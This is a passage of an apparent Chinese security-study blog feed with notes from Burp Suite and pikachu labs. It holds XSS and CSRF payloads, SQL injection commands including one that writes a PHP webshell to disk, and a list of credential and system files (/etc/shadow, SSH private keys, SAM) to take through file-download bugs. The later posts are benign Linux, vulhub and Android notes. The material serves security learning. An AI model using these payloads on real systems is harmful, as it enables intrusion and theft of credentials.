URL 结尾处使用 #x 聚焦该标签，从而触发 onfocus 事件。</p></li><li><p>一段 payload：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;svg&gt;&lt;animatetransform onbegin=alert (1)&gt;</span><br></pre></td></tr></table></figure></p></li><li><p>rel=&quot;canonical&quot; 标签用于解决由于网址形式不同而内容相同造成的内容重复问题，各大搜索引擎只显示该标签后续跟的 href 指定的 url。</p></li><li><p>一种 payload。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">accesskey=&#x27;x&#x27;onclick=&#x27;alert (1)</span><br></pre></td></tr></table></figure><br />accesskey 属性用来指定使元素获得焦点的快捷键。</p></li><li><p>目前见过两种绕过 \ 的方法，一种是重复标签，一种是提前闭合。</p></li><li><p>HTML 对标签标签和 &amp; apos; 先处理，之后才会有 javascript 进行处理，可以利用这一特性实现绕过。<br />22.JavaScript template literal 的特征，如果 `` 之间包含 ${code}，就会执行 code。</p></li><li><p>遇到 script 标签后，html 会停止解析并交给 javascript 解析，直到运行完毕。</p></li><li><p>使用 /**/ 来代替空格。</p></li><li><p>不带括弧调用函数。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;</span><br><span class="line">&lt;script&gt;&#123;onerror=alert&#125;throw 1337&lt;/script&gt;</span><br><span class="line">&lt;script&gt;throw onerror=alert,&#x27;some string&#x27;,123,&#x27;haha&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;&#123;onerror=eval&#125;throw&#x27;=alert\x281337\x29&#x27;&lt;/script&gt;   Chrome</span><br><span class="line"></span><br><span class="line">&lt;script&gt;&#123;onerror=eval&#125;throw&#123;lineNumber:1,columnNumber:1,fileName:1,message:&#x27;alert\x281\x29&#x27;&#125;&lt;/script&gt;  Firefox </span><br><span class="line">&lt;script&gt;&#123;onerror=prompt&#125;throw&#123;lineNumber:1,columnNumber:1,fileName:&#x27;second argument&#x27;,message:&#x27;first argument&#x27;&#125;&lt;/script&gt; Firefox</span><br><span class="line">&lt;script&gt;TypeError.prototype.name =&#x27;=/&#x27;,0 [onerror=eval][&#x27;/-alert (1)//&#x27;]&lt;/script&gt;</span><br><span class="line">&lt;script&gt;throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a [12]+[1337]+a [13]&lt;/script&gt;</span><br></pre></td></tr></table></figure></p></li><li><p>小结。<br />当 XSS 在 HTML 的 tag 之间时，尝试引入新的 tag。<br />当 XSS 在 HTML 的 tag 属性中时：1. 尝试闭合 tag 并引入新的 tag。2. 尝试闭合属性并引入新的属性。3. 检查该属性本身能否触发 XSS。<br />当 XSS 在 JavaScript 中时：尝试闭合当前 script 标签并引入新的 script。<br />当 XSS 在 JS 中的字符串中时：1. 尝试闭合两边的引号。如果 JS 对其中的符号进行了转义（\）, 可以尝试绕过 \。有时 XSS 能使用的字段也会被限制，可以尝试一些特殊的注入方式。<br />当 XSS 处于 JS 中，并且这个 JS 处于 HTML tag 中：可以尝试使用 HTML 编码绕过。<br />当 XSS 处于 JS 模板字符串中：有特殊的执行方法。</p></li><li></li></ol><p>Dangling markup，一种逃脱标签并发起访问的方式。配合使用 <span class="exturl" data-url="aHR0cDovL1dpbmRvdy5uYW1l">Window.name</span> 为表单和超链接提供目标，从而绕过 CSP。<br />28.<br />HTML 中的 input 如果有 name 属性，那就可以通过 get 传值，数据就会被提交到表单里，但是还不会发包。<br />29. 绕过 edge 的 csp<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.paypal.com/webapps/xoonboarding?values=etc&amp;token=SOMETOKEN;_</span><br></pre></td></tr></table></figure></p><h3 id="csrf-跨站请求攻击"><a class="anchor" href="#csrf-跨站请求攻击">#</a> CSRF (跨站请求攻击)</h3><ol><li>第一道题是使用的 burp 自带的 payload 生成工具，生成的 payload 如下。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState (&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;URL&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;EMAIL_ADDRESS&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      document.forms [0].submit ();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li>有的网页会检查 token，但更换下请求方式可能能绕过。</li><li>更改要检查的 token 名可能也能绕过。</li><li>可以考虑有的网站生成 token 后，没有和当前用户 session 绑定，因此如果当前 token 没有用于验证，可能会在后台持续存在。因此可以截获一段 request 并复制其 token，之后 drop 掉该 request，此时这段 token 便可用于 CSRF 包的构筑 ，因为没有与我的 session，victim 便可以用这个 token 修改他自己的包。</li><li>如果 token 与用户的 cookie 绑定，而用的 request 修改 session 后可能会导致用户退出，但修改 cookie 不会，则 cookie 可能并未与 session 绑定，因此可以尝试用 xss 漏洞配合 set-cookie 修改用户的 cookie，使其与自己的 payload 中的 token 一致。</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>information-collection</title>
    <link href="http://ericcd.com/2022/11/15/information-collection/"/>
    <id>http://ericcd.com/2022/11/15/information-collection/</id>
    <published>2022-11-15T13:57:34.000Z</published>
    <updated>2022-11-15T14:07:42.852Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些信息搜集工具。<br /><span id="more"></span></p><h1 id="子域名收集"><a class="anchor" href="#子域名收集">#</a> 子域名收集</h1><p>1.Knockpy<br />2.Sublist3r<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Fib3VsM2xhL1N1Ymxpc3Qzcg==">https://github.com/aboul3la/Sublist3r</span><br />3.Google dorks<br />4.GoogDrker<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1plcGhyRmlzaC9Hb29nRDBya2Vy">https://github.com/ZephrFish/GoogD0rker</span><br />5.Amass<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL09XQVNQL0FtYXNz">https://github.com/OWASP/Amass</span><br />6.curl<br />7. 自定义脚本</p><p>#Web 指纹<br /> 1.curl<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#  curl -i -X OPTIONS url</span><br></pre></td></tr></table></figure><br />2.NMAP<br />3. 自定义脚本</p><h1 id="应用识别"><a class="anchor" href="#应用识别">#</a> 应用识别</h1><p>1.Wappalyzer<br />2.Whatruns<br />3.WafW00f<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=">https://github.com/EnableSecurity/wafw00f</span></p><h1 id="目录扫描"><a class="anchor" href="#目录扫描">#</a> 目录扫描</h1><p>1.dirb<br />2.dirsearch<br />3.dir buster<br />4.nikto<br />5.Aquatone<br />6.burp intruder<br />7. 各类字典<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3Rz"> https://github.com/danielmiessler/SecLists</span></p><h1 id="隐藏参数发现"><a class="anchor" href="#隐藏参数发现">#</a> 隐藏参数发现</h1><p>1.Arjun<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9Bcmp1bg==">https://github.com/UltimateHackers/Arjun</span></p><h1 id="搜索引擎"><a class="anchor" href="#搜索引擎">#</a> 搜索引擎</h1><p>1.shodan<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># *country*: 找出指定国家的资产数据 </span><br><span class="line"></span><br><span class="line"># *hostname*: 找出指定主机名的资产数据 </span><br><span class="line"></span><br><span class="line"># *port*: 找出指定端口的资产数据 </span><br><span class="line"></span><br><span class="line"># *os*: 找出指定系统版本的资产数据 </span><br><span class="line"></span><br><span class="line"># *before/after*: 指定某个时期的资产数据 </span><br><span class="line"></span><br><span class="line"># *city*: 找出指定城市的资产数据 </span><br></pre></td></tr></table></figure><br />2.Censys</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一些信息搜集工具。&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>pikachu</title>
    <link href="http://ericcd.com/2022/09/20/pikachu/"/>
    <id>http://ericcd.com/2022/09/20/pikachu/</id>
    <published>2022-09-20T12:21:49.000Z</published>
    <updated>2022-09-20T12:39:12.613Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些在使用 pikahcu 练习时用到的命令。<br /><span id="more"></span></p><h1 id="sql-注入"><a class="anchor" href="#sql-注入">#</a> SQL 注入</h1><ol><li>获取数据库名<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># union select database ()</span><br></pre></td></tr></table></figure></li><li>获取表名<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># union select group_concat (table_name) from information_schema.tables where table_schema=database ()</span><br></pre></td></tr></table></figure></li><li>获取列名<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># union select group_concat (table_name) from information_schema.columns where table_name=&#x27; 表名 &#x27;</span><br></pre></td></tr></table></figure></li><li>读文件<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># union select load_file (&#x27;Path&#x27;) from 表名 </span><br></pre></td></tr></table></figure></li><li>写文件<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># union select &#x27;&lt;!php assert ($_POST [1];?)&gt;&#x27; into outfile &#x27;Path&#x27;</span><br></pre></td></tr></table></figure></li><li>报错回显<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># and updatexml (1,concat (0x7e,(select database ()),0x7e),1))</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一些在使用 pikahcu 练习时用到的命令。&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>linux-command</title>
    <link href="http://ericcd.com/2022/08/31/linux-command/"/>
    <id>http://ericcd.com/2022/08/31/linux-command/</id>
    <published>2022-08-31T07:02:26.000Z</published>
    <updated>2022-09-21T02:28:26.048Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些 linux 环境下会用到的命令。<br /><span id="more"></span></p><ol><li><p>设置代理。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># export http_proxy=&#x27;http://windows 的 ip: 代理端口 &#x27;</span><br><span class="line"># curl -vv google.com</span><br><span class="line"># git config --global https.proxy http://windows 的 ip: 代理端口 </span><br><span class="line"># git config --global https.proxy https://windows 的 ip: 代理端口 </span><br><span class="line"># git config --global http.proxy &#x27;socks5://windows 的 ip: 代理端口 &#x27;</span><br><span class="line"># git config --global https.proxy &#x27;socks5://windows 的 ip: 代理端口 &#x27;</span><br></pre></td></tr></table></figure></p></li><li><p>批量添加后缀名。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># find . -type f | awk -F &quot;.&quot; &#x27;&#123;print $2&#125;&#x27; | xargs -i -t mv ./&#123;&#125; ./&#123;&#125;.apk</span><br></pre></td></tr></table></figure></p></li><li><p>查看 python 版本。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  ls /usr/bin/python*</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li><li><p>添加 python 版本。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 1</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li><li><p>查看和更换 python 版本。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  update-alternatives --config python</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li><li><p>解决 apt install 失败的问题<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># sudo apt-get install aptitude</span><br><span class="line"># sudo aptitude install &lt;package-name&gt;</span><br></pre></td></tr></table></figure><br /> 之后从 aptitude 提供的解决方案中选择一种使用。</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一些 linux 环境下会用到的命令。&lt;br /&gt;</summary>
    
    
    
    <category term="linux" scheme="http://ericcd.com/categories/linux/"/>
    
    
    <category term="linux" scheme="http://ericcd.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞可以尝试下载的文件</title>
    <link href="http://ericcd.com/2022/08/20/file-download/"/>
    <id>http://ericcd.com/2022/08/20/file-download/</id>
    <published>2022-08-20T08:20:20.000Z</published>
    <updated>2022-08-20T08:24:46.738Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些利用文件下载漏洞下载的目标文件。<br /><span id="more"></span><br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#    Windows</span><br><span class="line">#    C:\boot.ini// 查看系统版本 </span><br><span class="line">#    C:\Windows\System32\inetsrv\MetaBase.xml//IIS 配置文件 </span><br><span class="line">#    C:\Windows\repair\sam // 存储系统初次安装的密码 </span><br><span class="line">#    C:\Program Files\mysql\my.ini//Mysql 配置 </span><br><span class="line">#    C:\Program Files\mysql\data\mysql\user.MYD//Mysql root</span><br><span class="line">#    C:\Windows\php.ini//php 配置信息 </span><br><span class="line">#    C:\Windows\my.ini//Mysql 配置信息 </span><br><span class="line">#    C:\Windows\win.ini//Windows 系统的一个基本系统配置文件 </span><br><span class="line">#   </span><br><span class="line">#    Linux</span><br><span class="line">#    /root/.ssh/authorized_keys</span><br><span class="line">#    /root/.ssh/id_rsa</span><br><span class="line">#    /root/.ssh/id_ras.keystore</span><br><span class="line">#    /root/.ssh/known_hosts// 记录每个访问计算机用户的公钥 </span><br><span class="line">#    /etc/passwd</span><br><span class="line">#    /etc/shadow</span><br><span class="line">#    /usr/local/app/php5/lib/php.ini//PHP 配置文件 </span><br><span class="line">#    /etc/my.cnf//mysql 配置文件 </span><br><span class="line">#    /etc/httpd/conf/httpd.conf//apache 配置文件 </span><br><span class="line">#    /root/.bash_history// 用户历史命令记录文件 </span><br><span class="line">#    /root/.mysql_history//mysql 历史命令记录文件 </span><br><span class="line">#    /proc/mounts// 记录系统挂载设备 </span><br><span class="line">#    /porc/config.gz// 内核配置文件 </span><br><span class="line">#    /var/lib/mlocate/mlocate.db// 全文件路径 </span><br><span class="line">#    /porc/self/cmdline// 当前进程的 cmdline 参数 </span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一些利用文件下载漏洞下载的目标文件。&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>vulhub 相关命令</title>
    <link href="http://ericcd.com/2022/07/23/vulhub-command/"/>
    <id>http://ericcd.com/2022/07/23/vulhub-command/</id>
    <published>2022-07-23T03:45:16.000Z</published>
    <updated>2022-07-23T03:50:12.325Z</updated>
    
    <content type="html"><![CDATA[<p>使用 vulhub 时会用到的命令。<br /><span id="more"></span></p><h1 id="下载-vulhub"><a class="anchor" href="#下载-vulhub">#</a> 下载 vulhub</h1><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line"># unzip vulhub-master.zip</span><br><span class="line"># cd vulhub-master</span><br></pre></td></tr></table></figure></p><h1 id="编译环境"><a class="anchor" href="#编译环境">#</a> 编译环境</h1><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># docker-compose build</span><br></pre></td></tr></table></figure></p><h1 id="启动环境"><a class="anchor" href="#启动环境">#</a> 启动环境</h1><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># docker-compose up -d</span><br></pre></td></tr></table></figure></p><h1 id="移除环境"><a class="anchor" href="#移除环境">#</a> 移除环境</h1><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># docker-compose down -v</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;使用 vulhub 时会用到的命令。&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>aosp 配置</title>
    <link href="http://ericcd.com/2022/07/19/aosp-related/"/>
    <id>http://ericcd.com/2022/07/19/aosp-related/</id>
    <published>2022-07-19T11:19:16.000Z</published>
    <updated>2022-07-19T11:36:55.172Z</updated>
    
    <content type="html"><![CDATA[<p>AOSP 配置过程中遇到的问题。<br /><span id="more"></span><br /> 环境：Ubuntu 18.04 ， Python3.6</p><h1 id="网络问题"><a class="anchor" href="#网络问题">#</a> 网络问题</h1><p>设置 Proxy 或更换国内源</p><h1 id="repo-安装"><a class="anchor" href="#repo-安装">#</a> repo 安装</h1><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#  mkdir ~/bin</span><br><span class="line">#  PATH=~/bin:$PATH</span><br><span class="line">#  curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo</span><br><span class="line">#  chmod a+x ~/bin/repo</span><br></pre></td></tr></table></figure></p><h1 id="python-版本控制"><a class="anchor" href="#python-版本控制">#</a> python 版本控制</h1><ol><li><p>查看 python 版本：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  ls /usr/bin/python*</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li><li><p>添加 python 版本：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 1</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li><li><p>查看和更换 python 版本：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  update-alternatives --config python</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;AOSP 配置过程中遇到的问题。&lt;br /&gt;</summary>
    
    
    
    <category term="Android" scheme="http://ericcd.com/categories/Android/"/>
    
    
    <category term="Android" scheme="http://ericcd.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>web 安全相关网站资源记录</title>
    <link href="http://ericcd.com/2022/07/17/url-log/"/>
    <id>http://ericcd.com/2022/07/17/url-log/</id>
    <published>2022-07-17T07:14:42.000Z</published>
    <updated>2022-08-10T13:40:46.052Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些学习到的 web 安全相关网站。<br /><span id="more"></span></p><h1 id="搜索引擎"><a class="anchor" href="#搜索引擎">#</a> 搜索引擎</h1><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2hvZGFuLmlvLw==">https://www.shodan.io/</span><br /><span class="exturl" data-url="aHR0cHM6Ly93d3cud2Vic2Nhbi5jYy8=">https://www.webscan.cc/</span> （同 ip 查询）<br /><span class="exturl" data-url="aHR0cHM6Ly9jcnQuc2gv">https://crt.sh/</span> （子域名查询）</p><h1 id="学习资源"><a class="anchor" href="#学习资源">#</a> 学习资源</h1><p><span class="exturl" data-url="aHR0cHM6Ly93ZWJzZWMucmVhZHRoZWRvY3MuaW8vemgvbGF0ZXN0L2luZGV4Lmh0bWw=">https://websec.readthedocs.io/zh/latest/index.html</span></p><h1 id="扫描工具"><a class="anchor" href="#扫描工具">#</a> 扫描工具</h1><p><span class="exturl" data-url="aHR0cHM6Ly9ubWFwLm9yZy8=">https://nmap.org/</span><br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hlbGxvZ29sZHNuYWtlbWFuL21hc25tYXBzY2FuLVYxLjA=">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</span>  （端口扫描器）<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=">https://github.com/EnableSecurity/wafw00f</span>  （WAF 扫描工具）<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vdGVlbW8=">https://github.com/bit4woo/teemo</span> （域名枚举工具）<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Z1enpkYi1wcm9qZWN0L2Z1enpkYg==">https://github.com/fuzzdb-project/fuzzdb</span> （Fuzz 工具）</p><h1 id="相关资源"><a class="anchor" href="#相关资源">#</a> 相关资源</h1><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0x1Y2lmZXIxOTkzL2Ntc3ByaW50">https://github.com/Lucifer1993/cmsprint</span>  （CMS 指纹库）<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL000dGlyL0dpdGh1Yi1Nb25pdG9y">https://github.com/M4tir/Github-Monitor</span> （漏洞发布监控工具）<br /><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYm1qb2tlci9wLzkzMjYyNTguaHRtbA==">https://www.cnblogs.com/bmjoker/p/9326258.html</span> （sqlmap 思维导图）<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RoZUtpbmdPZkR1Y2svZnV6ekRpY3Rz">https://github.com/TheKingOfDuck/fuzzDicts</span> （Fuzz 字典）<br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==">https://github.com/s0md3v/XSStrike</span> （XSS 绕过工具）</p><h1 id="sql-注入"><a class="anchor" href="#sql-注入">#</a> SQL 注入</h1><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lvdW5neWFuZ3lhbmcwNC9Ob1NRTEF0dGFjaw==">https://github.com/youngyangyang04/NoSQLAttack</span><br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw">https://github.com/sqlmapproject/sqlmap</span><br /><span class="exturl" data-url="aHR0cDovL2NleWUuaW8v">http://ceye.io/</span><br /><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FET09PL0Ruc2xvZ1NxbGluag==">https://github.com/ADOOO/DnslogSqlinj</span></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一些学习到的 web 安全相关网站。&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Android 框架 - init.rc 文件</title>
    <link href="http://ericcd.com/2022/03/31/Android-Framework-init-rc/"/>
    <id>http://ericcd.com/2022/03/31/Android-Framework-init-rc/</id>
    <published>2022-03-31T03:26:29.000Z</published>
    <updated>2022-03-31T03:32:34.449Z</updated>
    
    <content type="html"><![CDATA[<p>Android 框架中 init.rc 文件的相关知识。<br /><span id="more"></span><br />init.rc 文件不同于 init 进程，init 进程仅当编译完 Android 后才会生成，而 init.rc 文件存在于源码中。init 文件大致分为两部分，一部分是以 on 关键字开头的动作列表，一部分是以 service 关键字开头的服务列表。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Android 框架中 init.rc 文件的相关知识。&lt;br /&gt;</summary>
    
    
    
    <category term="Android" scheme="http://ericcd.com/categories/Android/"/>
    
    
    <category term="Knowledge" scheme="http://ericcd.com/tags/Knowledge/"/>
    
  </entry>
  
  <entry>
    <title>Android 框架 - init 进程</title>
    <link href="http://ericcd.com/2022/03/23/AndroidFramework-init/"/>
    <id>http://ericcd.com/2022/03/23/AndroidFramework-init/</id>
    <published>2022-03-23T03:25:48.000Z</published>
    <updated>2022-07-19T11:36:51.872Z</updated>
    
    <content type="html"><![CDATA[<p>Android 框架中 init 进程的相关知识。<br /><span id="more"></span><br />init 进程是 Android 启动后，由内核启动的第一个用户级进程。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 内核启动过程：</span><br><span class="line">#    start_kernel ()</span><br><span class="line">#    init_post ()</span><br><span class="line">#    run_init_process ()</span><br><span class="line">#</span><br><span class="line">#     static in noinline init_post (void)</span><br><span class="line">#     &#123;</span><br><span class="line">#               if (execute_command)&#123;</span><br><span class="line">#                          run_init_process (execute_command);</span><br><span class="line">#               &#125;</span><br><span class="line">#               run_init_process (&quot;/sbin/init&quot;);</span><br><span class="line">#               run_init_process (&quot;/etc/init&quot;);</span><br><span class="line">#               run_init_process (&quot;/bin/init&quot;);</span><br><span class="line">#               run_init_process (&quot;/bin/sh&quot;);</span><br><span class="line">#     &#125;</span><br></pre></td></tr></table></figure><br />init_post () 函数调用 run_init_process () 函数，获取注册在 execute_command 中的进程文件路径，执行 execve () 系统调用，execve () 函数执行参数传递过来的文件路径下的进程 。<br />当跟文件系统顶层目录中不存在 init 进程或未指定启动选项 &quot;init=&quot; 时，内核会到 /sbin,/etc,/bin 目录下查找 init 文件，如果仍未找到，则 init 进程停止，引发 Kernel Panic。</p><h1 id="init-工作流程"><a class="anchor" href="#init-工作流程">#</a> init 工作流程</h1><h2 id="sigchld-注册信号处理器"><a class="anchor" href="#sigchld-注册信号处理器">#</a> SIGCHLD 注册信号处理器</h2><p>当子进程终止时，会产生 SIGCHLD 信号，init 进程调用信号安装函数 sigaction ()，并通过参数传递至 sigaction 结构体中，完成信号处理器安装。<br />init 进程通过相关代码注册与子进程相关的 SIGCHLD 信号处理器，并把 sigaction 结构体中的 sa_flags 设置为 SA_NOCLDSTOP，该值表示仅当进程终止时才接受 SIGCHLD 信号。sigchld_handler 